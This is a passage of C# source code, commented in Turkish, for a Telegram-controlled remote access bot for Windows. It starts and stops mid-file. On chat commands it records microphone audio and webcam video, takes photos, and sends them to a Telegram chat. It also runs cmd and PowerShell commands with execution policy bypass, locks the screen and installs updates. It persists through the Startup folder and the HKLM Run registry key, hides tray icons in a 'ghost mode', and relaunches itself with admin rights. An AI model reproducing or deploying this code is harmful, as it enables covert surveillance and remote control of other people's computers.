                        await istemci.SendTextMessageAsync(chatID, "60 saniyelik ses kaydı başlatıldı\nBu süre içerisinde yazdığınız bot komutları ses kaydı bittiğinde çalıştırılacaktır!\nMesela /audio 3 size 60 saniyelik 3 tane ayrı ses mesajı yollar yani 3 dk lık ses.\nBu sürede botu kullanamazsınız!", replyToMessageId: msgID);
                    }
                    else if (msg.StartsWith("/🎙🎤🎧audio "))
                    {
                        msg = msg.Replace("/🎙🎤🎧audio ", "");
                        await istemci.SendTextMessageAsync(chatID, "60 saniyelik ses kaydı başlatıldı\nBu süre içerisinde yazdığınız bot komutları ses kaydı bittiğinde çalıştırılacaktır!\nMesela /audio 3 size 60 saniyelik 3 tane ayrı ses mesajı yollar yani 3 dk lık ses.\nBu sürede botu kullanamazsınız!", replyToMessageId: msgID);
                    }
                    else if (msg.StartsWith("/audio")) await istemci.SendTextMessageAsync(chatID, "60 saniyelik ses kaydı başlatıldı\nBu süre içerisinde yazdığınız bot komutları ses kaydı bittiğinde çalıştırılacaktır!\nMesela /audio 3 size 60 saniyelik 3 tane ayrı ses mesajı yollar yani 3 dk lık ses.\nBu sürede botu kullanamazsınız!", replyToMessageId: msgID);
                    else if (msg.StartsWith("/ses "))
                    {
                        msg = msg.Replace("/ses ", "");
                        await istemci.SendTextMessageAsync(chatID, "60 saniyelik ses kaydı başlatıldı\nBu süre içerisinde yazdığınız bot komutları ses kaydı bittiğinde çalıştırılacaktır!\nMesela /ses 3 size 60 saniyelik 3 tane ayrı ses mesajı yollar yani 3 dk lık ses.\nBu sürede botu kullanamazsınız!", replyToMessageId: msgID);
                    }
                    else if (msg.StartsWith("/ses")) await istemci.SendTextMessageAsync(chatID, "60 saniyelik ses kaydı başlatıldı\nBu süre içerisinde yazdığınız bot komutları ses kaydı bittiğinde çalıştırılacaktır!\nMesela /ses 3 size 60 saniyelik 3 tane ayrı ses mesajı yollar yani 3 dk lık ses.\nBu sürede botu kullanamazsınız!", replyToMessageId: msgID);
                    try
                    {
                        int repeat = Convert.ToInt32(msg);
                        for (int i = 1; i <= repeat; i++)
                        {
                            string filePath2 = await CreateAudioRecordingAsync(audioTimeLength);
                            if (filePath2!=null||System.IO.File.Exists(filePath2))
                            {
                                var stream2 = InputFile.FromStream(System.IO.File.OpenRead("./" + filePath2), fileName: filePath2);
                                await istemci.SendVideoAsync(chatID, stream2, replyToMessageId: msgID, caption: $"{i}/{repeat} Ses, {(repeat * 60) / 60} Dakika");
                            }
                            else
                            {
                                if (filePath2 == null)
                                {
                                    await istemci.SendTextMessageAsync(chatID, "Mikrofon bulunamadı! (filePath2= null)", replyToMessageId: msgID);
                                }
                                else if (!System.IO.File.Exists(filePath2))
                                {
                                    await istemci.SendTextMessageAsync(chatID, "Mikrofon bulunamadı! (filePath2= Dosya bulunamadı!)", replyToMessageId: msgID);
                                }
                            }


                        }
                    }
                    catch (Exception)
                    {
                        string filePath = null;
                        try
                        {
                            filePath = await CreateAudioRecordingAsync(audioTimeLength);
                        }
                        catch (Exception ex)
                        {
                            if (logMessages)    
                                await istemci.SendTextMessageAsync(chatID, $"{ex}", replyToMessageId: msgID);
                        }
                        if (filePath != null && System.IO.File.Exists(filePath))
                        {
                            var stream = InputFile.FromStream(System.IO.File.OpenRead("./" + filePath), fileName: filePath);
                            await istemci.SendVideoAsync(chatID, stream, replyToMessageId: msgID, caption: $"1/1 Ses, 1 Dakika");
                        }
                        else
                        {
                            if (filePath == null)
                            {
                                await istemci.SendTextMessageAsync(chatID, "Mikrofon bulunamadı!", replyToMessageId: msgID);
                            }
                            else if (!System.IO.File.Exists(filePath))
                            {
                                await istemci.SendTextMessageAsync(chatID, "Mikrofon bulunamadı!", replyToMessageId: msgID);
                            }
                        }

                    }
                    try
                    {
                        if (System.IO.File.Exists("./temp.mp4")) System.IO.File.Delete("./temp.mp4");
                        if (System.IO.File.Exists("./temp.mp3")) System.IO.File.Delete("./temp.mp3");
                        if (System.IO.File.Exists("./temp.wav")) System.IO.File.Delete("./temp.wav");
                    }
                    catch (Exception ex) { if(logMessages) await istemci.SendTextMessageAsync(chatID, $"{ex}", replyToMessageId: msgID); }
                    return;
                    #endregion
                }
                else if (msg=="/webcam" || msg=="/cam" || msg=="/snap" || msg=="/foto" || msg=="/fotoğraf"||msg== "/📸snapwebcam")
                {
                    #region Kameradan fotoğraf çekme mantığı
                    string filePath = null;
                    try
                    {
                        await istemci.SendTextMessageAsync(chatID, "Webcamden fotoğraf çekiliyor.\n(/webcam, /cam, /snap, /foto, /fotoğraf)\nBu sürede botu kullanamazsınız!", replyToMessageId: msgID);
                        try
                        {
                            filePath = await CapturePhotoAsync();
                        }
                        catch (Exception)
                        {
                            if(logMessages) await istemci.SendTextMessageAsync(chatID, "Webcam bulunamadı!", replyToMessageId: msgID);
                        }
                        if (filePath!=null&&System.IO.File.Exists(filePath))
                        {
                            var stream = InputFile.FromStream(System.IO.File.OpenRead("./" + filePath), fileName: filePath);
                            await istemci.SendPhotoAsync(chatID, stream, replyToMessageId: msgID, caption: $"1/1 Foto, Webcam");
                        }
                        else
                        {
                            await istemci.SendTextMessageAsync(chatID, "Webcam bulunamadı!", replyToMessageId: msgID);
                        }
                    }
                    catch (Exception ex) { if(logMessages) await istemci.SendTextMessageAsync(chatID, $"{ex}", replyToMessageId: msgID); }
                    try
                    {
                        if (System.IO.File.Exists("./temp.png")) System.IO.File.Delete("./temp.png");
                    }
                    catch (Exception ex)
                    {
                        if (logMessages) await istemci.SendTextMessageAsync(chatID, $"{ex}", replyToMessageId: msgID);
                    }
                    return;
                    #endregion
                }
                else if (msg.StartsWith("/camvideo") || msg.StartsWith("/recordvideo") || msg.StartsWith("/capvid") || msg.StartsWith("/cv")||msg.StartsWith("/📹recordwebcam "))
                {
                    #region Kameradan video çekme mantığı
                    TimeSpan videoTimeLength = TimeSpan.FromSeconds(60);
                    double fps = 30f;
                    try
                    {
                        if (System.IO.File.Exists("./temp.mp4")) System.IO.File.Delete("./temp.mp4");
                        if (System.IO.File.Exists("./temp2.mp4")) System.IO.File.Delete("./temp2.mp4");
                        if (System.IO.File.Exists("./temp.mp3")) System.IO.File.Delete("./temp.mp3");
                        if (System.IO.File.Exists("./temp.wav")) System.IO.File.Delete("./temp.wav");
                    }
                    catch (Exception ex)
                    {
                        if (logMessages) await istemci.SendTextMessageAsync(chatID, $"Error: /camvideo : {ex}", replyToMessageId: msgID);
                    }
                    ///📹recordwebcam 
                    await istemci.SendTextMessageAsync(chatID, "Webcamden video çekiliyor.\n(/camvideo, /cv, /capvid, /recordvideo)\nBu sürede botu kullanamazsınız!\n/cv 2 komutu, 2 tane 60 saniyelik video çeker.", replyToMessageId: msgID);
                    if (msg.StartsWith("/camvideo "))
                        msg = msg.Replace("/camvideo ", "");
                    else if (msg.StartsWith("/📹recordwebcam "))
                        msg = msg.Replace("/📹recordwebcam ", "");
                    else if (msg.StartsWith("/recordvideo "))
                        msg = msg.Replace("/recordvideo ", "");
                    else if (msg.StartsWith("/capvid "))
                        msg = msg.Replace("/capvid ", "");
                    else if (msg.StartsWith("/cv "))
                        msg = msg.Replace("/cv ", "");
                    try
                    {
                        int repeat = Convert.ToInt32(msg);
                        for (int i = 1; i <= repeat; i++)
                        {
                            string filePath2 = null;
                            try
                            {
                                filePath2 = await CaptureVideoAsync(videoTimeLength, fps);
                            }
                            catch (Exception ex)
                            {

                                if (logMessages) await istemci.SendTextMessageAsync(chatID, $"{ex}", replyToMessageId: msgID);
                            }
                            
                            if (filePath2!=null&&System.IO.File.Exists(filePath2))
                            {
                                var stream2 = InputFile.FromStream(System.IO.File.OpenRead("./" + filePath2), fileName: filePath2);
                                await istemci.SendVideoAsync(chatID, stream2, replyToMessageId: msgID, caption: $"{i}/{repeat} Video, {(repeat * 60) / 60} Dakika");
                            }
                            else await istemci.SendTextMessageAsync(chatID, $"Webcam takılı değil!\n{filePath2}", replyToMessageId: msgID);
                        }
                    }
                    catch (Exception)
                    {
                        try
                        {
                            string filePath = null;
                            try
                            {
                                filePath = await CaptureVideoAsync(videoTimeLength, fps);
                            }
                            catch (Exception ex)
                            {
                                if (logMessages) await istemci.SendTextMessageAsync(chatID, $"{ex}", replyToMessageId: msgID);
                            }

                            if (filePath!=null&&System.IO.File.Exists(filePath))
                            {
                                var stream = InputFile.FromStream(System.IO.File.OpenRead("./" + filePath), fileName: filePath);
                                await istemci.SendVideoAsync(chatID, stream, replyToMessageId: msgID, caption: $"1/1 Video, 1 Dakika");
                            }
                            else await istemci.SendTextMessageAsync(chatID, $"Webcam takılı değil!\n{filePath}", replyToMessageId: msgID);
                        }
                        catch (Exception ex) { if (logMessages) await istemci.SendTextMessageAsync(chatID, $"{ex}", replyToMessageId: msgID); }
                    }
                    try
                    {
                        if (System.IO.File.Exists("./temp.mp4")) System.IO.File.Delete("./temp.mp4");
                        if (System.IO.File.Exists("./temp2.mp4")) System.IO.File.Delete("./temp2.mp4");
                        if (System.IO.File.Exists("./temp.mp3")) System.IO.File.Delete("./temp.mp3");
                        if (System.IO.File.Exists("./temp.wav")) System.IO.File.Delete("./temp.wav");
                    }
                    catch (Exception ex)
                    {
                        if (logMessages) await istemci.SendTextMessageAsync(chatID, $"{ex}", replyToMessageId: msgID);
                    }
                    return;
                    #endregion
                }
                else if (msg=="/lock"||msg=="/kilitle"||msg=="/") {
                    #region Bilgisayarın ekranını kilitleme mantığı
                    msg = msg.Replace("/cmd ", "");
                    output = cmd("Rundll32.exe user32.dll,LockWorkStation");
                    await istemci.SendTextMessageAsync(chatID, $"Bilgisayar ekranı kilitlendi.{output}", replyToMessageId: msgID);
                    return;
                    #endregion
                }
                else if (msg == "/updateonline"||msg=="/updateoffline"||msg.StartsWith("/updatekb "))
                {

                    // Create an UpdateSession
                    UpdateSession updateSession = new UpdateSession();
                    // Create an UpdateSearcher
                    IUpdateSearcher updateSearcher = updateSession.CreateUpdateSearcher();
                    updateSearcher.Online = true; // Search for installed updates only
                    if (msg=="/updateonline") updateSearcher.Online = true;
                    else if (msg=="/updateoffline") updateSearcher.Online = false;
                    if (msg.StartsWith("/updatekb ")) {
                        string kbID = msg.Replace("/updatekb ", "");
                        //Install-WindowsUpdate -KBArticleID KB2267602 -Confirm:$false
                        await istemci.SendTextMessageAsync(chatID, $"Eşleşen Bir KB12345 id bulunursa güncelleme yüklenecek...\n{kbID}", replyToMessageId: msgID);
                        string psCMD = $"Install-WindowsUpdate -KBArticleID {kbID} -Confirm:$false";
                        output = ps(psCMD);
                        await istemci.SendTextMessageAsync(chatID, $"{output}", replyToMessageId: msgID);
                    }
                    #region list updates
                    if (msg=="/updateonline"||msg=="/updateoffline")
                    {
                        try
                        {
                            // Search for installed updates
                            ISearchResult searchResult = updateSearcher.Search("IsInstalled=1 And IsHidden=0");

                            // Print the count of installed updates
                            await istemci.SendTextMessageAsync(chatID, $"Bulunan Update sayısı:{searchResult.Updates.Count.ToString()}\n", replyToMessageId: msgID);
                            //List<string> tempListUT = new List<string> { };
                            // Print the titles of installed updates
                            int uc = 0;
                            await istemci.SendTextMessageAsync(chatID, $"Updateler listeleniyor:", replyToMessageId: msgID);
                            foreach (IUpdate update in searchResult.Updates)
                            {
                                //tempListUT.Add(update.Title);
                                await istemci.SendTextMessageAsync(chatID, $"Update_{uc.ToString()}:\n{update.Title}", replyToMessageId: msgID);
                                uc++;
                                Thread.Sleep(1000);//1sn bekle
                            }
                        }
                        catch (Exception ex)
                        {
                            try
                            {
                                await istemci.SendTextMessageAsync(chatID, $"Hata: {ex.ToString()}\n", replyToMessageId: msgID);
                            }
                            catch (Exception)
                            {}

                        }
                    }
                    #endregion
                }
                /* Çalışmıyodu galiba bi sıkıntısı vardı o yüzden Yorum satırı.
                else if (msg.StartsWith("/unlock") || msg.StartsWith("/kilidiaç"))//Deneysel, her bilgisayarda çalışmayabilir.
                {
                    try
                    {
                        if (msg.StartsWith("/unlock"))
                        {
                            msg=msg.Replace("/unlock ","");
                        }
                        else if (msg.StartsWith("/kilidiaç"))
                        {
                            msg = msg.Replace("/kilidiaç ","");
                        }
                        IntPtr token;
                        await istemci.SendTextMessageAsync(chatID, $"User:{Environment.UserName}", replyToMessageId: msgID);
                        bool logIn = LogonUser(Environment.UserName,null, msg, 2, 0, out token);
                        if (logIn) {
                        
                            CloseHandle(token);
                            await istemci.SendTextMessageAsync(chatID, $"Bilgisayarın kilidi açıldı.", replyToMessageId: msgID);
                            return;
                        }
                        else
                        {
                            int error = Marshal.GetLastWin32Error();
                            await istemci.SendTextMessageAsync(chatID, $"Bilgisayarın kilidi açılamadı.{error}", replyToMessageId: msgID);
                            return;
                        }
                        /*SendKeys.SendWait("{Backspace}");
                        Thread.Sleep(500);
                        SendKeys.SendWait("{Backspace}");
                        Thread.Sleep(500);
                        SendKeys.SendWait($"{msg}");
                        return;*//*
                    }
                    catch (Exception ex)
                    {
                        await istemci.SendTextMessageAsync(chatID, $".{ex}", replyToMessageId: msgID);
                        return;
                    }
                }*/
                else if (msg.StartsWith("/add")|| msg.StartsWith("/remove")||msg== "/✅️logon✅️"||msg== "/❌️logon❌️"||msg== "/✅️start✅️"||msg== "/❌️start❌️")
                {
                    #region Botu başlangıçta otomatik çalıştırma mantığı
                    if (msg=="/add"||msg=="/remove")
                    {
                        if (msg=="/add")
                            await istemci.SendTextMessageAsync(chatID, $"/add ne komutun devamını yaz!", replyToMessageId: msgID);
                        else if (msg=="/remove")
                            await istemci.SendTextMessageAsync(chatID, $"/remove ne komutun devamını yaz", replyToMessageId: msgID);
                        await istemci.SendTextMessageAsync(chatID, $"/add logon Botu kullanıcı hesabı oturum açınca başlatır.\n/remove logon bu olayı kapatır.\n/add start Botu bilgisayar başlangıcında otomatik olarak başlatır.\n/remove start Botu bilgisayar başlangıcında otomatik olarak başlatma özelliğini kapatır.", replyToMessageId: msgID);
                        return;
                    }
                    if (msg=="/add logon"||msg== "/✅️logon✅️")
                    {
                        try
                        {
                            appExactPath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
                            WshShell shell = new WshShell();
                            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(userStartupProgramsPath + "\\telegramremoteaccessbot.lnk");
                            shortcut.TargetPath = appExactPath;
                            shortcut.IconLocation = appExactPath; // Set the icon location (optional)
                            shortcut.Save();
                            await istemci.SendTextMessageAsync(chatID, $"Bot oturum açtığınızda otomatik olarak başlatılacak!", replyToMessageId: msgID);
                            return;
                        }
                        catch (Exception ex){ if (logMessages) await istemci.SendTextMessageAsync(chatID, $"Error: /add logon : {ex}", replyToMessageId: msgID);return; }
                    }
                    else if (msg == "/remove logon"||msg== "/❌️logon❌️")
                    {
                        try
                        {
                            if (System.IO.File.Exists(userStartupProgramsPath + "\\telegramremoteaccessbot.lnk"))
                                System.IO.File.Delete(userStartupProgramsPath + "\\telegramremoteaccessbot.lnk");
                            await istemci.SendTextMessageAsync(chatID, $"Bot artık oturum açtığınızda otomatik olarak başlatılmayacak!", replyToMessageId: msgID);
                            return;
                        }
                        catch (Exception ex) { if (logMessages) await istemci.SendTextMessageAsync(chatID, $"Error: /remove logon : {ex}", replyToMessageId: msgID);return; }
                    }
                    else if (msg=="/add start"||msg== "/✅️start✅️")
                    {
                        try
                        {
                            appExactPath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
                            using (Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                            {
                                if (key == null)
                                {
                                    RegistryKey createKey = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", writable: true);
                                    createKey.SetValue("TelegramRemoteAccessBot", "\""+appExactPath+"\"", Microsoft.Win32.RegistryValueKind.String);
                                }
                                else if (key != null)
                                    key.SetValue("TelegramRemoteAccessBot", "\""+appExactPath+"\"", Microsoft.Win32.RegistryValueKind.String);
                            }
                            await istemci.SendTextMessageAsync(chatID, $"Bot artık bilgisayarı açtığınızda otomatik olarak başlatılacak!", replyToMessageId: msgID);
                            return;
                        }
                        catch (Exception ex){if (logMessages) await istemci.SendTextMessageAsync(chatID, $"Error: /add start : {ex}", replyToMessageId: msgID);return; }
                    }
                    else if (msg=="/remove start"||msg== "/❌️start❌️")
                    {
                        try
                        {
                            appExactPath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
                            using (Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                            {
                                if (key == null)
                                {
                                    RegistryKey createKey = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", writable: true);
                                    createKey.SetValue("TelegramRemoteAccessBot", appExactPath, Microsoft.Win32.RegistryValueKind.String);
                                }
                                else if (key != null) key.DeleteValue("TelegramRemoteAccessBot");
                            }
                            await istemci.SendTextMessageAsync(chatID, $"Bot artık bilgisayarı açtığınızda otomatik olarak başlatılmayacak!", replyToMessageId: msgID);
                            return;
                        }
                        catch (Exception ex) { if (logMessages) await istemci.SendTextMessageAsync(chatID, $"Error: /remove start : {ex}", replyToMessageId: msgID); return; }
                    }
                    return;
                    #endregion
                }
                else if (msg== "/❌️👻"||msg== "/✅️👻"||msg=="/ghoston"||msg=="/ghostoff")
                {
                    try
                    {
                        if (msg== "/❌️👻"||msg== "/ghostoff")
                        {
                            await hideSystemTray(false);
                            await istemci.SendTextMessageAsync(chatID, $"👻Hayalet Modu Kapalı👻\nSistem simgeleri kalıcı olarak gösteriliyor.", replyToMessageId: msgID);
                        }
                        else if (msg == "/✅️👻" || msg == "/ghoston")
                        {
                            await hideSystemTray(true);
                            await istemci.SendTextMessageAsync(chatID, $"👻Hayalet Modu Açık👻\nSistem simgeleri kalıcı olarak gizlendi.", replyToMessageId: msgID);
                        }
                    }
                    catch (Exception ex){if (logMessages) await istemci.SendTextMessageAsync(chatID, $"Error: /remove start : {ex}", replyToMessageId: msgID);}
                    return;
                }
                else if (msg.StartsWith("/uuid"))
                {
                    if (msg=="/uuid" ||msg=="/uuid get")
                    {
                        await istemci.SendTextMessageAsync(chatID, $"Şu anki UUID:{uuid}\n/uuid set ABCDEFG bu bilgisayarin eşsiz temsilcisi olarak atanır.\nKomut çağırırken '/uuid uuid_değeri /ss' komutu mesela /ss komutunu sadece uuid değeri eşleştiği bilgisayarda çalışır!", replyToMessageId: msgID);
                        return;
                    }
                    else if (msg.StartsWith("/uuid set "))
                    {
                        msg = msg.Replace("/uuid set ","");
                        uuid = msg;
                        try
                        {
                            if (System.IO.File.Exists("./uuid")) System.IO.File.Delete("./uuid");
                            System.IO.File.WriteAllText("./uuid",uuid);
                            await istemci.SendTextMessageAsync(chatID, $"Şu anki UUID:{uuid}\nolarak kaydedildi!", replyToMessageId: msgID);
                            return;
                        }
                        catch (Exception ex)
                        {
                            if (logMessages) log($"{ex}");
                            await istemci.SendTextMessageAsync(chatID, $"UUID ayarlanamadı!", replyToMessageId: msgID);
                            return;
                        }
                    }

                }
                else if (msg.StartsWith("/exit")||msg== "/❌️exit")
                {
                    #region Bot kapatma mantığı
                    await istemci.SendTextMessageAsync(chatID, $"Bot kapatılıyor!");
                    //Environment.Exit(0);
                    //Bilerek bu şekilde kodlandı <!>
                        #pragma warning disable CS4014 // Beklemeyelim
                                            exit();
                        #pragma warning restore CS4014 // Beklemeyelim
                    return;
                    #endregion
                }
            }
            catch (Exception ex)
            {
            #pragma warning disable CS4014 // Beklemeyelim
                if(logMessages)MessageBox.Show($"{ex}");
                Client_MessageLoopAsync(); //Botun çökmesi durumunda, yeniden çalıştıralım.
            #pragma warning restore CS4014 // Beklemeyelim
            }
        }
        #endregion
        static async Task exit() { await Task.Delay(TimeSpan.FromSeconds(1)); Environment.Exit(0); }
        #region Program kapanırken arkaplandaki herşeyi kapat
        private void MainForm_FormClosed(object sender, FormClosedEventArgs e)
        {
            Environment.Exit(0);
        }
        #endregion
        #region Lisans Kontrolü
        static async Task<Boolean> checkUserIDLicense(string userid)
        {
            /////////Freeware Now//////////
            hasLicense = true;
            return true;
            //////////////////////////////
            #pragma warning disable CS0162 // Beklemeyelim
            try
            {
                using (var responseStream = await httpClient.GetStreamAsync(userIDUrl))
                {
                    using (var reader = new StreamReader(responseStream))
                    {
                        string line;
                        while ((line = await reader.ReadLineAsync()) != null)
                        {
                            if (line.ToString().Trim() == userid.ToString().Trim())
                            { 
                                hasLicense = true;
                                return true;
                            }
                        }
                        hasLicense = false;
                        return false;
                    }
                }
            }
            catch (Exception ) { /*MessageBox.Show(ex.ToString());*/ return false; }
            #pragma warning restore CS0162 // Beklemeyelim
        }
        #endregion
        #region Log dosyasına hata veya olay kaydetme komutu
        static private void logThread(string text)
        {
            if (logMessages) { 
                text=Environment.NewLine+text+Environment.NewLine;
                System.IO.File.AppendAllText("./log.txt", text);
            }
        }
        static private void log(string text)
        {
            Thread bt = new Thread(() => logThread(text));
            bt.Start();
            bt.Join();
        }
        #endregion
        #region Powershell komut çalıştırma metodu
        static private string ps(string komut)
        {
            string output = "", error = "";
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = "-noprofile -executionpolicy bypass -command \"" + komut + "\"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                using (Process process = new Process { StartInfo = psi })
                {
                    process.Start();
                    output = process.StandardOutput.ReadToEnd();
                    error = process.StandardError.ReadToEnd();
                    process.WaitForExit();
                    return output.Trim() + error.Trim();
                }
            }
            catch (Exception)
            { return "Powershell komutu çalıştırılamadı"; }

        }
        #endregion
        #region Komut satırında komut çalıştırma metodu
        static private string cmd(string komut)
        {
            string output = "", error = "";
            try
            {
                Process L = new Process();
                L.StartInfo.FileName = "CMD.EXE";
                L.StartInfo.Arguments = "/C " + komut;
                L.StartInfo.UseShellExecute = false;
                L.StartInfo.RedirectStandardOutput = true;
                L.StartInfo.RedirectStandardError = true;
                L.StartInfo.CreateNoWindow = true;
                L.Start();
                output = L.StandardOutput.ReadToEnd();
                error = L.StandardError.ReadToEnd();
                L.WaitForExit();
            }
            catch (Exception){}
            if (logMessages) log(output);
            if (logMessages) log(error);
            return output + " " + error;
        }
        #endregion
        #region Admin olarak çalıştırma metodu
        static private void runAsAdministrator()
        {
            var wi = WindowsIdentity.GetCurrent();
            var wp = new WindowsPrincipal(wi);
            bool runAsAdmin = wp.IsInRole(WindowsBuiltInRole.Administrator);
            if (!runAsAdmin)
            {
                var processInfo = new ProcessStartInfo(Assembly.GetExecutingAssembly().CodeBase);
                processInfo.UseShellExecute = true;
                processInfo.Verb = "runas";
                try { Process.Start(processInfo); }
                catch (Exception) { MessageBox.Show("Run me as Administrator!"); }
                System.Windows.Forms.Application.Exit();
                Environment.Exit(0);
            }
        }
        #endregion
        #region Ekran kaydı alma metodu
        static private async Task<string> CreateRecordingAsync(TimeSpan time)
        {
            Recorder _rec = Recorder.CreateRecorder();
            _rec.OnRecordingComplete += Rec_OnRecordingComplete;
            _rec.OnRecordingFailed += Rec_OnRecordingFailed;
            _rec.OnStatusChanged += Rec_OnStatusChanged;
            RecorderOptions options = new RecorderOptions
            {
                AudioOptions = new AudioOptions
                {
                    Bitrate = AudioBitrate.bitrate_128kbps,
                    Channels = AudioChannels.Stereo,
                    IsAudioEnabled = true,
                    IsOutputDeviceEnabled = true,
                    IsInputDeviceEnabled = true,
                    AudioOutputDevice = null,
                    AudioInputDevice = null,
                    InputVolume = 1,
                    OutputVolume = 1,
                }
            };
            _rec.SetOptions(options);
            string videoPath = Path.Combine(Application.StartupPath.ToString(), "temp.mp4");
            _rec.Record(videoPath);
            await Task.Delay(time + TimeSpan.FromSeconds(1));
            _rec.Stop();
            await Task.Delay(TimeSpan.FromSeconds(1));
            _rec.Dispose();
            return videoPath;
        }
        static private async Task WaitForDurationAsync(TimeSpan time)
        {
            var stopwatch = Stopwatch.StartNew();
            while (stopwatch.Elapsed < time)
            {
                // Check the recording status periodically
                await Task.Delay(100); // Adjust the delay as needed
            }
        }

        static private void Rec_OnRecordingComplete(object sender, RecordingCompleteEventArgs e)
        {
            // Get the file path if recorded to a file
            string path = e.FilePath;
            //_recordingCompletionSource.SetResult(path);
        }

        static private void Rec_OnRecordingFailed(object sender, RecordingFailedEventArgs e)
        {
            string error = e.Error;
            //_recordingCompletionSource.SetException(new Exception(error)); // Signal failure
        }

        static private void Rec_OnStatusChanged(object sender, RecordingStatusEventArgs e)
        {
            RecorderStatus status = e.Status;
        }
        #endregion
        #region Ses kaydı alma metodu
        static private async Task<string> CreateAudioRecordingAsync(TimeSpan time)
        {       
            MediaFoundationApi.Startup();
            await Task.Delay(TimeSpan.FromSeconds(1));
            var waveIn = new WaveInEvent();
            WaveFileWriter writer = null;
            try
            {
                if (System.IO.File.Exists("./temp.mp4"))
                    System.IO.File.Delete("./temp.mp4");
                if (System.IO.File.Exists("./temp2.mp4"))
                    System.IO.File.Delete("./temp2.mp4");
                if (System.IO.File.Exists("./temp.mp3"))
                    System.IO.File.Delete("./temp.mp3");
                if (System.IO.File.Exists("./temp.wav"))
                    System.IO.File.Delete("./temp.wav");

                writer = new WaveFileWriter("./temp.wav", waveIn.WaveFormat);
                waveIn.StartRecording();
                waveIn.DataAvailable += (s, a) =>
                {
                    writer.Write(a.Buffer, 0, a.BytesRecorded);
                };
                await Task.Delay(time + TimeSpan.FromSeconds(1));
            }
            catch (Exception){}
            finally
            {
                waveIn.StopRecording();
                await Task.Delay(TimeSpan.FromSeconds(1));
                waveIn.Dispose();
                writer.Dispose();
                await Task.Delay(TimeSpan.FromSeconds(1));
            }
            try
            {
                using (var reader = new WaveFileReader("./temp.wav"))
                {
                    MediaFoundationEncoder.EncodeToAac(reader, "./temp.mp4");
                    MediaFoundationApi.Shutdown();
                }
                return "temp.mp4";
            }
            catch (Exception)
            {
                try
                {
                    using (var reader = new WaveFileReader("./temp.wav"))
                    {
                        MediaFoundationEncoder.EncodeToMp3(reader, "./temp.mp3");
                        MediaFoundationApi.Shutdown();
                    }
                    return "temp.mp3";
                }
                catch (Exception ex){if (logMessages) log($"{ex}");}
                return null;
            }
        }
        #endregion
        #region Kameradan fotoğraf çekme metodu
        static private async Task<string> CapturePhotoAsync()
        {
            try
            {
                var snap = new VideoCapture(0);
                Mat frame = snap.QueryFrame();
                //await Task.Delay(TimeSpan.FromSeconds(1));
                CvInvoke.Imwrite("temp.png", frame);
                await Task.Delay(TimeSpan.FromSeconds(1));
                return "temp.png";
            }
            catch (Exception) { return null; }
        }
        #endregion
        #region Kameradan video çekme metodu Yedek
        static private async Task<string> CaptureVideoAsync2(TimeSpan time, double fps)
        {
            bool noMicFound = false;
            try
            {
                //Zaten varolan dosyaları sil.
                try
                {
                    if (System.IO.File.Exists("./temp.mp4")) System.IO.File.Delete("./temp.mp4");
                    if (System.IO.File.Exists("./temp2.mp4")) System.IO.File.Delete("./temp2.mp4");
                    if (System.IO.File.Exists("./temp.mp3")) System.IO.File.Delete("./temp.mp3");
                    if (System.IO.File.Exists("./temp.wav")) System.IO.File.Delete("./temp.wav");
                }
                catch (Exception ex) { if (logMessages) log(ex.ToString()); }

                //audio rec
                MediaFoundationApi.Startup();
                await Task.Delay(TimeSpan.FromSeconds(1));
                var waveIn = new WaveInEvent();
                WaveFileWriter writer = null;
                writer = new WaveFileWriter("./temp.wav", waveIn.WaveFormat);
                try
                {
                    waveIn.StartRecording();
                    waveIn.DataAvailable += (s, a) =>
                    {
                        writer.Write(a.Buffer, 0, a.BytesRecorded);
                    };
                }
                catch (Exception ex) { if (logMessages) log(ex.ToString()); noMicFound = true; if (logMessages) log("NO MIC FOUND:" + noMicFound.ToString()); }
                //video rec
                var video = new VideoCapture(0);
                var videoWriter = new VideoWriter("temp.mp4", VideoWriter.Fourcc('X', '2', '6', '4'), fps, new Size(video.Width, video.Height), true);
                var startTime = DateTime.Now;
                var duration = time;
                try
                {
                    while (DateTime.Now - startTime < duration)
                    {
                        var frame = new Mat();
                        video.Read(frame);
                        if (frame.IsEmpty) break;
                        videoWriter.Write(frame);
                    }
                }
                catch (Exception ex)
                {
                    waveIn.StopRecording();
                    await Task.Delay(TimeSpan.FromSeconds(1));
                    waveIn.Dispose();
                    writer.Dispose();
                    videoWriter.Dispose();
                    video.Dispose();
                    if (logMessages) log($"{ex}");
                    return null;
                }
                finally
                {
                    if (waveIn != null)
                    {
                        waveIn.StopRecording();
                        await Task.Delay(TimeSpan.FromSeconds(1));
                        waveIn.Dispose();
                    }
                    if (writer != null)
                        writer.Dispose();
                    if (videoWriter != null)
                        videoWriter.Dispose();
                    if (video != null)
                        video.Dispose();
                }

                //Combine video and audio
                if (!noMicFound)
                {
                    try
                    {
                        string ffmpegPath = Path.Combine(Application.StartupPath.ToString(), "ffmpeg.exe");
                        string wavPath = Path.Combine(Application.StartupPath.ToString(), "temp.wav");
                        string mp4Path = Path.Combine(Application.StartupPath.ToString(), "temp.mp4");
                        string outMp3Path = Path.Combine(Application.StartupPath.ToString(), "temp.mp3");
                        Process p = new Process();
                        p.StartInfo.FileName = "CMD.EXE";
                        p.StartInfo.Arguments = $"/C {ffmpegPath} -i {wavPath} -vn -ar 44100 -ac 2 -b:a 192k -strict -1 {outMp3Path} -y";
                        p.StartInfo.RedirectStandardError = false;
                        p.StartInfo.RedirectStandardOutput = false;
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        try
                        {
                            p.Start();
                            p.WaitForExit();
                        }
                        catch (Exception ex)
                        {
                            if (logMessages) log(ex.ToString());
                            MediaFoundationApi.Shutdown();
